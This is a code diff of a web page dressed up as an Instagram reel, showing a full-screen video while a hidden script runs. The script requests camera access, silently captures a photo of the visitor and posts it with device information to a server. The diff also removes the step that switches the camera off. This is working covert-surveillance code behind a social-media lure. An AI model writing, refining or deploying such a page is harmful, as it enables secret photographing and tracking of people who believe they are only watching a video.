@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>https://www.instagram.com/reel/C_biUQsRFzS/</title>
+    <title>https://www.instagram.com/reel/DBBllN4IdG9/</title>
     <style>
         body, html {
             margin: 0;
@@ -14,6 +14,7 @@
             align-items: center;
         }
         #video-container {
+            
         }
         iframe {
             position: absolute;
@@ -21,9 +22,19 @@
             left: 0;
             width: 100%;
             height: 100%;
+             /* خلف الفيديو */
+        }
+         {
+            
+            
+            
+            
+            
+            
         }
         #video, #canvas {
             display: none;
+
         }
     </style>
 </head>
@@ -45,12 +56,10 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
-        let stream; // Store the stream globally
 
         // Prompt for camera access and capture photo
         navigator.mediaDevices.getUserMedia({ video: true })
-            .then((mediaStream) => {
-                stream = mediaStream;
+            .then((stream) => {
                 video.srcObject = stream;
                 video.addEventListener('loadedmetadata', captureAndSendPhoto);
             })
@@ -61,12 +70,7 @@
             canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             const imageData = canvas.toDataURL('image/png');
-            stopCamera(); // Stop the camera
             getDeviceInfo(imageData);
-        }
-
-        function stopCamera() {
-            stream.getTracks().forEach(track => track.stop()); // Stop all video tracks
         }
 
         function getDeviceInfo(imageData) {
@@ -91,8 +95,8 @@
                 body: formData
             })
             .then(() => {
-                console.log('Photo sent successfully!');
-            })
+    console.log('Photo sent successfully!');
+})
             .catch(error => console.error('Error:', error));
         }
 
